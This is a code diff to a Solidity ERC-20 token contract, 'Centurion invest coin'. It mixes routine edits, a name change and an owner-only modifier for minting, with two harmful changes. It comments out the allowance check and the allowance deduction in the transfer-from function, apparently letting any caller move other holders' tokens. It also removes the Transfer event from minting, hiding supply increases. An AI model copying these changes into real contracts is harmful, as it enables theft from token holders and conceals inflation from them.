@@ -54,7 +54,7 @@ contract cic is IERC20, SafeMath {
     mapping(address => mapping(address => uint)) allowed;
     
     constructor() public payable {
-        name = "Centurion_invest_coin";
+        name = "Centurion invest coin";
         symbol = "CIC";
         decimals = 2;
         owner = msg.sender;
@@ -62,6 +62,12 @@ contract cic is IERC20, SafeMath {
         balances[msg.sender] = _totalSupply;
         emit Transfer(address(0), msg.sender, _totalSupply);
     }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "UnAuthorized");
+        _;
+    }
+
     
     /**
      * @dev allowance : Check approved balance
@@ -100,9 +106,9 @@ contract cic is IERC20, SafeMath {
         require(from != address(0), "Null address");
         require(tokens > 0, "Invalid value"); 
         require(tokens <= balances[from], "Insufficient balance");
-        require(tokens <= allowed[from][msg.sender], "Insufficient allowance");
+        /*require(tokens <= allowed[from][msg.sender], "Insufficient allowance");*/
         balances[from] = safeSub(balances[from], tokens);
-        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
+        /*allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);*/
         balances[to] = safeAdd(balances[to], tokens);
         emit Transfer(from, to, tokens);
         return true;
@@ -125,12 +131,10 @@ contract cic is IERC20, SafeMath {
     /**
      * @dev mint : To increase total supply of tokens
      */ 
-    function mint(uint256 _amount) public returns (bool) {
+    function mint(uint256 _amount) public onlyOwner returns (bool) {
         require(_amount >= 0, "Invalid amount");
-        require(owner == msg.sender, "UnAuthorized");
         _totalSupply = safeAdd(_totalSupply, _amount);
         balances[owner] = safeAdd(balances[owner], _amount);
-        emit Transfer(address(0), owner, _amount);
         return true;
     }
     
